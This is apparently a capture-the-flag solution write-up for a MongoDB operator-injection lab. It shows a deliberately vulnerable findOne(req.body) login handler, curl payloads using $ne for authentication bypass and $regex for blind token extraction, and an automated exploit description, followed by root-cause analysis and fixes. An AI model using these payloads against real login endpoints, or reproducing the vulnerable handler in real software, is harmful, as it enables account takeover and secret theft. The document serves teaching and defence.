# Solution — MongoDB Operator Injection on Login

## The vulnerability

`POST /login` forwards the parsed JSON body directly into a native MongoDB query:

```js
const user = await db.collection('users').findOne(req.body); // CWE-943
```

MongoDB query filters are documents, and a field value can be either a **scalar**
(`"admin"`) or an **operator object** (`{"$ne": null}`, `{"$regex": "^ab"}`).
Because the handler trusts `req.body` to be `{username, password}` scalars but
never enforces it, an attacker chooses the value shape and injects query operators.
The native driver (reached via `mongoose.connection.db.collection(...)`) performs
no schema casting, so the operators pass straight to the query engine.

The same class of mistake as classic SQLI — untrusted input crossing into the
query language without being kept as _data_ — expressed in Mongo's document query
API.

## Stage 1 — Authentication bypass with `$ne`

Instead of guessing admin's password, ask for "any user whose username and
password are not null". The admin document is the first one inserted, so it is the
first natural-order match `findOne` returns:

```bash
curl -sS -X POST http://127.0.0.1:<port>/login \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
# -> 200 {"authenticated":true,"username":"admin","role":"administrator",...}
```

`{"$gt":""}` works just as well as `{"$ne":null}`. You are now "logged in" as
admin with no credentials.

## Stage 2 — Blind extraction of `reset_token` with `$regex`

The bypass proves the whole body becomes the filter — which means **any** field on
the document is reachable, including `reset_token`. Add it to the filter with a
`$regex` anchored to a prefix and read the answer from the status code:

```bash
# 200 -> admin.reset_token starts with "ab"; 401 -> it does not
curl -sS -o /dev/null -w '%{http_code}\n' -X POST http://127.0.0.1:<port>/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","reset_token":{"$regex":"^ab"}}'
```

That is a boolean oracle. Grow the known prefix one hex nibble at a time: for each
position, try `known + c` for `c` in `0-9a-f`; exactly one returns 200 — append it
and continue. The token is 64 hex characters, so this is 64 rounds of at most 16
probes each. Firing the 16 probes for a position concurrently makes the whole
extraction take ~64 sequential requests' worth of time — a few seconds against a
local container.

## Stage 3 — Claim the flag

`POST /solve` compares your submission to the stored per-container `reset_token`
(via a fixed, non-injectable query) and, only on an exact match, reads the flag
file and returns it:

```bash
curl -sS -X POST http://127.0.0.1:<port>/solve \
  -H 'Content-Type: application/json' \
  -d '{"token":"<recovered 64-hex token>"}'
# -> 200 {"ok":true,"flag":"FLAG{...}"}
```

## Automated exploit

`tests/exploit.py` performs all three stages automatically (standard library
only). It:

1. confirms the `$ne` bypass authenticates,
2. sanity-checks the oracle (an impossible `z` prefix must not match),
3. extracts all 64 hex characters via threaded `$regex` prefix probes, then
4. submits the token to `/solve` and prints the flag on the last stdout line.

```bash
python3 tests/exploit.py --target http://127.0.0.1:<port>
```

`tests/checker.sh` runs it and asserts the last line matches
`^FLAG\{[0-9a-f]{64}\}$`.

## Why it works / root cause

The root cause is a **trust-boundary type confusion**: the handler assumes request
fields are strings and lets the request instead decide whether each field is data
or an operator. MongoDB's expressive filter language then does exactly what the
attacker asked.

## The fix

- **Constrain the shape at the boundary.** Reject any login field that is not a
  string before it reaches the query: `typeof username === 'string' && typeof
password === 'string'`, or validate with a schema (zod/Joi/Mongoose with
  `runValidators` and strict casting).
- **Never build a filter from a raw body.** Construct it explicitly from known
  fields: `findOne({ username: String(body.username) })`, then verify the password
  hash in code with a constant-time compare — do not let the database do the
  password check by document match.
- **Disable operator interpretation on user input** where a library supports it
  (e.g. `express-mongo-sanitize`, or Mongoose's strict query casting), as a
  defence-in-depth layer on top of explicit validation.
- **Least privilege for secrets.** A `reset_token` should be single-use,
  short-lived, and stored hashed — not left queryable as a long-lived plaintext
  field on the user document.

## Lab-vs-production deviations

- **In-app native-driver query.** The vulnerable line uses
  `mongoose.connection.db.collection('users').findOne(req.body)` — Mongoose for
  connection management, the native driver for the query. This is a realistic
  "we dropped to the raw collection for flexibility" pattern and is what makes the
  operators reach the engine unfiltered (a strict Mongoose model would cast/strip
  them). A production bug is often exactly this shape.
- **No database authentication.** MongoDB runs without credentials because it is
  only reachable on the lab's dedicated internal bridge network and publishes no
  ports. A real deployment must enable auth and TLS; it is omitted here purely to
  keep the lab focused on the injection.
- **`reset_token` length is unchanged (64 hex).** It matches the catalog exactly.
  The blind extraction stays well under the 60-second gate because the 16
  candidate probes per position are issued concurrently, so no secret-shortening
  deviation was needed.
